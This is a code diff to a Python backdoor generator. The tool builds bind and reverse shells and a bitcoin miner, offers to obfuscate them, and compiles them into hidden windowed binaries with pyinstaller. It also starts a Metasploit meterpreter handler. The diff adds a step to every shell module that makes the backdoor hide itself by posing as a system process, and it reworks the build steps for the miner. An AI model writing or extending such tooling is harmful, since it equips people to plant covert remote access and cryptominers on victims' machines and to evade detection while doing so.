@@ -364,6 +364,7 @@ main()
         ina.write(b)
 def postgen():
     opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
+    global encrypted
     encrypted = False
     if opt_obf == 'y':
         encrypted = True
@@ -372,15 +373,16 @@ def postgen():
     compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
     if compiling == 'y':
         if encrypted == True:
-            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii --hidden-import urllib3 '+name+'_or.py'
+            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_or.py'
             os.system(compcomd)
             print('Saved under "dist" folder')
         else:
-            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii --hidden-import urllib3 '+name
+            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
             os.system(compcomd)
             os.system(clear)
             print(logo)
             print('Backdoor saved under "dist" folder')
+def rep_syst():
     hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (y/n): ')
     if hide == 'y':
         global name2
@@ -546,14 +548,17 @@ nscan = input("Please select a module: ")
 if nscan == "1":
     gen_bind()
     postgen()
+    rep_syst()
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
 if nscan == "2":
     gen_rev()
     postgen()
+    rep_syst()
 if nscan == "3":
     gen_rev_http()
     postgen()
+    rep_syst()
     cleanup()
     os.system('clear')
     print('Generated in dist')
@@ -566,6 +571,7 @@ if nscan == "3":
 if nscan == "4":
     gen_rev_ssl_tcp()
     postgen()
+    rep_syst()
     cleanup()
     os.system('clear')
     print('Generated in dist')
@@ -584,7 +590,24 @@ if nscan == '5':
     listen('0.0.0.0', port)
 if nscan == '6':
     gen_btc_miner()
-    postgen()
+    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
+    encrypted = False
+    if opt_obf == 'y':
+        encrypted = True
+        import obfuscator
+        obfuscator.MainMenu(name)
+    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
+    if compiling == 'y':
+        if encrypted == True:
+            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name+'_or.py'
+            os.system(compcomd)
+            print('Saved under "dist" folder')
+        else:
+            compcomd = 'pyinstaller -F --windowed --hidden-import socket --hidden-import json --hidden-import pprint --hidden-import hashlib --hidden-import binascii '+name
+            os.system(compcomd)
+            os.system(clear)
+            print(logo)
+            print('Backdoor saved under "dist" folder')
     cleanup()
 else:
     print('Please select a vaild option')
